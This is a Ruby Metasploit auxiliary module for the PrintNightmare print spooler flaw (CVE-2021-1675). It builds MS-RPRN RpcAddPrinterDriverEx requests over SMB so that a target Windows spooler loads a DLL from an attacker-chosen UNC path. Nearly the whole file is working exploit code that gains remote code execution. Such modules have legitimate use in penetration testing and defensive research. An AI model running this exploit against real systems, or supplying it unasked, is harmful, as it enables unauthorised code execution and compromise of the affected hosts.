##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'

module PrintSystem
  UUID = '12345678-1234-abcd-ef00-0123456789ab'.freeze
  VER_MAJOR = 1
  VER_MINOR = 0

  # Operation numbers
  RPC_ADD_PRINTER_DRIVER_EX = 89

  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2
  class DriverInfo2 < BinData::Record
    endian :little

    uint32     :c_version
    uint32     :p_name_ref_id
    uint32     :p_environment_ref_id
    uint32     :p_driver_path_ref_id
    uint32     :p_data_file_ref_id
    uint32     :p_config_file_ref_id
    ndr_string :p_name, only_if: -> { p_name_ref_id != 0 }
    string     :pad1, length: -> { pad_length(p_name) }
    ndr_string :p_environment, only_if: -> { p_name_ref_id != 0 }
    string     :pad2, length: -> { pad_length(p_environment) }
    ndr_string :p_driver_path, only_if: -> { p_name_ref_id != 0 }
    string     :pad3, length: -> { pad_length(p_driver_path) }
    ndr_string :p_data_file, only_if: -> { p_name_ref_id != 0 }
    string     :pad4, length: -> { pad_length(p_data_file) }
    ndr_string :p_config_file, only_if: -> { p_name_ref_id != 0 }
    string     :pad5, length: -> { pad_length(p_config_file) }

    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  class PDriverInfo2 < RubySMB::Dcerpc::Ndr::NdrPointer
    endian :little

    driver_info2 :referent, onlyif: -> { referent_id != 0 }
  end

  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/3a3f9cf7-8ec4-4921-b1f6-86cf8d139bc2
  class DriverContainer < BinData::Record
    endian :little

    uint32               :level, check_value: -> { [2].include?(value) }
    uint32               :tag
    choice :driver_info, selection: :level do
      p_driver_info2 2
    end
  end

  # [3.1.4.4.8 RpcAddPrinterDriverEx (Opnum 89)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b)
  class RpcAddPrinterDriverExRequest < BinData::Record
    attr_reader :opnum

    endian :little

    ndr_lp_str       :p_name
    string           :pad1, length: -> { pad_length(p_name) }
    driver_container :p_driver_container
    string           :pad2, length: -> { pad_length(p_driver_container) }
    uint32           :dw_file_copy_flags

    def initialize_instance
      super
      @opnum = RPC_ADD_PRINTER_DRIVER_EX
    end

    # Determines the correct length for the padding, so that the next
    # field is 4-byte aligned.
    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  class RpcAddPrinterDriverExResponse < BinData::Record
    attr_reader :opnum

    endian :little

    def initialize_instance
      super
      @opnum = RPC_ADD_PRINTER_DRIVER_EX
    end

    uint32 :error_status
  end
end

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated

  CheckCode = Exploit::CheckCode
  # PrintSystem = RubySMB::Dcerpc::PrintSystem

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Print Spooler Remote DLL Injection',
        'Description' => %q{
          The print spooler service can be abused to load a remote DLL through a
          crafted DCERPC request.
        },
        'Author' => [
          'Zhiniang Peng',           # vulnerability discovery / research
          'Xuefeng Li',              # vulnerability discovery / research
          'Zhipeng Huo',             # vulnerability discovery
          'Piotr Madej',             # vulnerability discovery
          'Zhang Yunhai',            # vulnerability discovery
          'cube0x0',                 # PoC
          'Spencer McIntyre',        # metasploit module
          'Christophe De La Fuente', # metasploit module co-author
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-1675'],
          ['URL', 'https://github.com/cube0x0/CVE-2021-1675'],
          ['URL', 'https://github.com/afwu/PrintNightmare']
        ],
        'Notes' => {
          'AKA' => [ 'PrintNightmare' ],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [
            UNRELIABLE_SESSION # appears to fail after succeeding once until the server is restarted
          ],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [ false, 'The netlogon RPC port' ]),
        OptString.new('UNC_PATH', [ true, 'The UNC path the the DLL that the server should load' ])
      ]
    )
  end

  def run
    connect
    smb_login

    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
    vprint_status("Binding to #{handle} ...")
    begin
      dcerpc_bind(handle)
    rescue RubySMB::Error::UnexpectedStatusCode => e
      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
      fail_with(Failure::Unreachable, "The DCERPC bind failed with error #{nt_status.name} (#{nt_status.description})")
    end
    vprint_status("Bound to #{handle} ...")
    vprint_status('Obtaining a service manager handle...')

    container = PrintSystem::DriverContainer.new(
      level: 2,
      tag: 2,
      driver_info: PrintSystem::DriverInfo2.new(
        c_version: 3,
        p_name_ref_id: 0x00020000,
        p_environment_ref_id: 0x00020004,
        p_driver_path_ref_id: 0x00020008,
        p_data_file_ref_id: 0x0002000c,
        p_config_file_ref_id: 0x00020010,
        # TODO: randomize / fixup these values where able
        p_name: 'metasploit',
        p_environment: 'Windows x64',
        p_driver_path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL',
        p_data_file: datastore['UNC_PATH'],
        p_config_file: 'C:\\Windows\\System32\\kernelbase.dll'
      )
    )

    filename = datastore['UNC_PATH'].split('\\').last

    # TODO: properly define the flags value
    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)

    container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\#{filename}")
    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)

    container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\2\\#{filename}")
    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)

    container.driver_info.p_config_file.assign("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\3\\#{filename}")
    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, 0x8014)
  end

  def add_printer_driver_ex(name, container, flags)
    begin
      response = rprn_call('RpcAddPrinterDriverEx', p_name: name, p_driver_container: container, dw_file_copy_flags: flags)
    rescue RubySMB::Error::UnexpectedStatusCode => e
      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
      message = "Error #{nt_status.name} (#{nt_status.description})"
      if nt_status == ::WindowsError::NTStatus::STATUS_PIPE_BROKEN
        # STATUS_PIPE_BROKEN is the return value when the payload is executed, so this is somewhat expected
        vprint_status(message)
      else
        print_error(message)
      end

      return
    end

    message = "RpcAddPrinterDriverEx response #{response.error_status}"
    errors = ::WindowsError::Win32.find_by_retval(response.error_status.value)
    unless errors.empty?
      error = errors.first
      message << " #{error.name} (#{error.description})"
    end
    vprint_status(message)

    response
  end

  def rprn_call(name, **kwargs)
    request = PrintSystem.const_get("#{name}Request").new(**kwargs)

    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault
      fail_with(Failure::UnexpectedReply, "The #{name} Print System RPC request failed")
    end

    PrintSystem.const_get("#{name}Response").read(raw_response)
  end
end
